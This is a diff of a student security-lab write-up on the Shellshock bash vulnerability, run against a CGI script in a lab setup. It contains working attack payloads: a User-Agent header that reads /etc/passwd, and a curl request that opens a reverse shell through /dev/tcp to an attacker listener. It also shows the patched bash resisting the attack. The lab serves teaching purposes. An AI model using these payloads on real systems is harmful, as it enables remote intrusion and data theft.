@@ -3,12 +3,12 @@
 ### Collaborators: None
 
 ## Task 1
-In this task we check to see if the `/bin/bash_shellshock` and `/bin/bash` shells are vulnerable to shellshock. Shellshock was a vulnerability in bash that exploits how environment variables are passed to child processes. Specifically, if a bash function is written as a string and saved as an environment variable (ex. `foo='() { echo Hello, World; };'`) it will be parsed as a function when the environment variables are inherited by a new Bash shell. Moreover, Bash parses and executes when evaluating this, so subsequent commands will be executed when the function is parsed. For example, the string `"Executed"` will be printed when the below environment variable is inherited by a new vulnerable Bash shell.
+In this task we check to see if the `/bin/bash_shellshock` and `/bin/bash` shells are vulnerable to shellshock. Shellshock was a vulnerability in bash that exploits how environment variables are passed to child Bash shell. Specifically, if a Bash function is written as a string and saved as an environment variable (ex. `foo='() { echo Hello, World; };'`) it will be parsed as a function when the environment variables are inherited by a vulnerable Bash shell. Moreover, Bash parses and executes when evaluating this, so subsequent commands will be executed when the function is parsed. For example, the string `"Executed"` will be printed when the below environment variable is inherited by a new vulnerable Bash shell.
 ```sh
 FOO='() { echo junk; }; echo Executed'
 ``` 
 
-This behavior is demonstrated in Figure 1. If we create the following shell variable:
+This behavior is demonstrated in Figure 1. If we create the following environment variable:
 ```sh
 export FOO='() { echo Hello; }; echo vulnerable'
 ```
@@ -16,9 +16,13 @@ We would expect a vulnerable version of bash to print the string `"vulnerable"`.
 
 ![Task 1: /bin/bash_shellshock shell](./Screenshots/task1_a.png)
 
+\newpage
+
 However, Figure 2 illustrates that the updated version of Bash is not susceptible to this vulnerability. When the new Bash shell is spawned, `"vulnerable"` is not printed. Upon further inspection, it is evident that the environment variable `FOO` has not been parsed as a function and remains a string.
 
 ![Task 1: /bin/bash shell](./Screenshots/task1_b.png)
+
+\newpage
 
 ## Task 2
 Figure 3 illustrates how we can use a simple CGI script to return some data on a GET request. This program simply prints out `"Hello World"` when executed. 
@@ -38,6 +42,8 @@ curl http://localhost/cgi-bin/myprog.cgi
 
 ![Task 2: Performing a curl request](./Screenshots/task2.png)
 
+\newpage
+
 ## Task 3
 In this task we will demonstrate how we can modify environment variables during request processing. To illustrate this, we shall use a modification of the above CGI script.
 ```sh
@@ -52,6 +58,8 @@ When executed, this CGI script will return a list of all environment variables i
 
 ![Task 3: A GCI script that returns environment variables](./Screenshots/task3_a.png)
 
+\newpage
+
 Note that the HTTP headers are included in these environment variables, so the Bash program must be including them before executing the CGI script. We can verify this with the below request.
 ```sh
 curl http://localhost/cgi-bin/myprog2 -H "User-agent: my string"
@@ -59,10 +67,12 @@ curl http://localhost/cgi-bin/myprog2 -H "User-agent: my string"
 
 The below figure illustrates the result of this request. The HTTP_USER_AGENT variable, which was previously curl/7.47.0, is now "my string". Thus, we can manipulate the environment variables through HTTP headers that are sent with the request.
 
-![Task 3: A request that modifys environment variables](./Screenshots/task3_b.png)
+![Task 3: A request that modifies environment variables](./Screenshots/task3_b.png)
+
+\newpage
 
 ## Task 4
-We will now launch a Shellshock attack and steal the contents of the `/etc/passwd` file. To do this, we will modify the environment variables as described in Task 3 in such a way that we are able to emulate the behavior of `strings /proc/$$/environ` in the modified CGI script of Task 3. As described in Task 1, we can do this by defining an environment variable as the string representation of a function, and adding a command to end that is executed when the string is parsed. Since we want the data in `/etc/passwd`, the command we wish to execute is `strings /etc/passwd`. Specifically, we want to set an environment variable as follows.
+We will now launch a Shellshock attack and steal the contents of the `/etc/passwd` file. To do this, we will modify the environment variables as described in Task 3 in such a way that we are able to emulate the behavior of `strings /proc/$$/environ` in the modified CGI script of Task 3. As described in Task 1, we can do this by defining an environment variable as the string representation of a function, and adding a command that is executed when the string is parsed. Since we want the data in `/etc/passwd`, the command we wish to execute is `strings /etc/passwd`. Specifically, we want to set an environment variable as follows.
 ```sh
 HTTP_USER_AGENT="() { :; }; echo; /bin/bash -c 'strings /etc/passwd'"
 ```
@@ -70,6 +80,8 @@ HTTP_USER_AGENT="() { :; }; echo; /bin/bash -c 'strings /etc/passwd'"
 This string contains an initial function that does nothing, followed by an echo, and a command to spawn a Bash shell and execute `strings /etc/passwd`. Indeed, if we run this we receive the contents of the file as expected.
 
 ![Task 4: Stealing the contents of /etc/passwd](./Screenshots/task4_a.png)
+
+\newpage
 
 However, we are unable to steal the contents of /etc/shadow. This is because the Bash program that is invoked does not have read permissions for this file, and thus `strings /etc/shadow` fails with Permission Denied. If we examine the `/etc/shadow` file it has the following permissions:
 ```
@@ -83,6 +95,8 @@ Whereas the `/etc/passwd` file has the following.
 
 ![Task 4: We cannot steal /etc/shadow](./Screenshots/task4_b.png)
 
+\newpage
+
 ## Task 5:
 We will now launch a Shellshock attack to receive a reverse shell to the machine. Similar to Task 4, we will pass a malicious HTTP header that will set up the reverse shell when parsed and executed by a vulnerable bash program. As described in the lab text, we wish to execute the following command on the victim machine where LHOST and LPORT are the IP address and listening port of the attacking machine.
 ```sh
@@ -91,9 +105,11 @@ We will now launch a Shellshock attack to receive a reverse shell to the machine
 
 This command will call /bin/bash in interactive mode (-i), and direct the output of the shell to the TCP connection to LHOST's LPORT (/dev/tcp/\<LHOST\>/\<LPORT\>). We then indicate to use the same TCP connection as the input device by specifying to use the standard output device as the standard input device (0<&1). Finally, we also indicate the stderr output to be directed to stdout (the TCP connection) with 2>&1.
 
-Our request now becomes the following, where `<RHOST>` is the IP address of the victim.
+Our request now becomes the following, where `<RHOST>` is the IP address of the victim. Note an example shell script containing this request is included in the Source Code. It will create a reverse shell on localhost.
 ```sh
-curl -H "User-Agent: () { :; }; echo; /bin/bash -i > /dev/tcp/<LHOST>/<LPORT> 0<&1 2>&1" "http://<RHOST>/cgi-bin/myprog.cgi"
+curl -H "User-Agent: () { :; }; echo; /bin/bash -i > \
+/dev/tcp/<LHOST>/<LPORT> 0<&1 2>&1" \
+	"http://<RHOST>/cgi-bin/myprog.cgi"
 ```
 
 We can run this on localhost and receive a reverse shell. The variables used in this request are as follows.
@@ -105,8 +121,12 @@ We can run this on localhost and receive a reverse shell. The variables used in 
 | RHOST    | localhost |
 
 ![Task 5: Setting up a listener on localhost](./Screenshots/task5_a.png)
+
 ![Task 5: Creating the HTTP request on localhost](./Screenshots/task5_b.png)
+
 ![Task 5: Obtaining a reverse shell on localhost](./Screenshots/task5_c.png)
+
+\newpage
 
 However, we can also attack this machine as a remote user. The below figures illustrate executing this attack from the Kali machine. Note that in these examples the variables in the request are as follows.
 
@@ -117,8 +137,12 @@ However, we can also attack this machine as a remote user. The below figures ill
 | RHOST    | 192.168.219.165 |
 
 ![Task 5: Setting up a listener on Kali](./Screenshots/task5_d.png)
+
 ![Task 5: Creating the HTTP request on Kali](./Screenshots/task5_e.png)
+
 ![Task 5: Obtaining the reverse shell on Kali](./Screenshots/task5_f.png)
+
+\newpage
 
 ## Task 6
 We shall now try to execute this attack using the patched bash, and two new CGI scripts. The only difference between these and what were used in Tasks 2-5 are the shell being used (bash vs. bash_shellshock). Since the Bash shell has this vulnerability patched, we would expect the attack to fail.
@@ -147,7 +171,10 @@ strings /proc/$$/environ
 First, let's verify that we can reproduce the same behavior as in Task 3. As shown below, we are able to call the program and return the environment variables as before.
 
 ![Task 6: The Bash CGI script returns Hello World](./Screenshots/task6_a.png)
+
 ![Task 6: The Bash CGI script returns environment variables](./Screenshots/task6_b.png)
+
+\newpage
 
 Similarly, we can also inject environment variables through HTTP headers (note "my_variable" for HTTP_USER_AGENT).
 
@@ -156,4 +183,5 @@ Similarly, we can also inject environment variables through HTTP headers (note "
 However, the key difference is that we are not able execute a Shellshock attack. Like we demonstrated in Task 1, where passing a malicious environment variable to a new Bash shell did not print the string `"vulnerable"`, we are not able to get the patched version of Bash to parse and execute our string. As a result, a similar request as was made in Task 5 fails, and simply returns the `"Hello World"` string rather than giving us a reverse shell. This is illustrated in the below figures where we attempt to pass the same malicious User-Agent HTTP header to spawn a reverse shell. The initial curl request returns with "Hello World" and we get no shell on our listener.
 
 ![Task 6: Attempting to send a malicious request with Kali. This simply returns "Hello World"](./Screenshots/task6_d.png)
+
 ![Task 6: We do not receive a reverse shell on our listener](./Screenshots/task6_e.png)
